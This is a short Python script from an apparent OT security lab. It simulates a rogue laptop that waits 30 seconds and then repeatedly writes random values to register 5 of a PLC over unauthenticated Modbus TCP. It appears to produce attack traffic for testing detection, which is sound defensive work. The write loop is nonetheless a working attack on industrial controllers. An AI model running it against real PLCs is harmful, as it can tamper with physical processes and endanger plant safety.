"""
SentinelOT lab — Rogue device.
Simulates an unauthorized laptop on the OT network: sits quietly for a
while (representing an attacker doing reconnaissance / lying dormant),
then issues a genuine Modbus WRITE to the PLC -- something only the
legitimate HMI should ever do. This is a real, distinct device on the
network, not the same box as the HMI or the PLC.
"""
import random
import time
from pymodbus.client import ModbusTcpClient

PLC_HOST = "172.28.240.211"
PLC_PORT = 502
DORMANT_SECONDS = 30   # time before the rogue device acts, like recon time
WRITE_INTERVAL_S = 20  # how often it writes once active

def main():
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    print(f"Rogue device online, staying dormant for {DORMANT_SECONDS}s (simulating recon)...")
    time.sleep(DORMANT_SECONDS)
    print("Rogue device now active -- issuing unauthorized writes.")

    while True:
        if not client.connect():
            print("could not connect to PLC, retrying...")
            time.sleep(3)
            continue
        value = random.randint(1, 999)
        result = client.write_register(address=5, value=value, slave=1)
        if result.isError():
            print("write error:", result)
        else:
            print(f">>> UNAUTHORIZED WRITE issued: register 5 = {value}")
        time.sleep(WRITE_INTERVAL_S)

if __name__ == "__main__":
    main()
